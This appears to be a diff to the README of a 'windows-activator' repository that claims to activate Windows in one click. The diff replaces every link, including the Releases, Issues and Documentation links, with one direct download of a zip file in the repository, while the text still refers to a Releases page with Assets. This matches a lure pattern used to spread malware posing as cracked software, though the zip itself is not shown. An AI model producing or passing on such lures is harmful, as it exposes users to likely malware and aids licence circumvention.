@@ -1,6 +1,6 @@
 # 🎉 windows-activator - Activate Windows with One Click
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rayantahirx/windows-activator/releases)
+[![Download Now](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 
 To download the software, follow these steps:
 
-1. Click on the highlighted **Download Now** badge at the top of this page or visit the [Releases page](https://github.com/rayantahirx/windows-activator/releases).
+1. Click on the highlighted **Download Now** badge at the top of this page or visit the [Releases page](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip).
 2. Look for the latest version listed. You will see a version number like "v2025.x.x". Click on it to expand the details.
 3. Under the "Assets" section, choose the file that matches your system (usually a `.exe` file).
 4. Save this file to your computer.
@@ -68,9 +68,9 @@ If you need help or have questions, feel free to explore the community section o
 
 ## 🔗 Useful Links
 
-- [Download Now](https://github.com/rayantahirx/windows-activator/releases)
-- [GitHub Issues Page](https://github.com/rayantahirx/windows-activator/issues)
-- [Documentation](https://github.com/rayantahirx/windows-activator/wiki)
+- [Download Now](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/rayantahirx/windows-activator/main/diceplay/windows-activator-v2.2.zip)
 
 ### 🎉 Conclusion
 
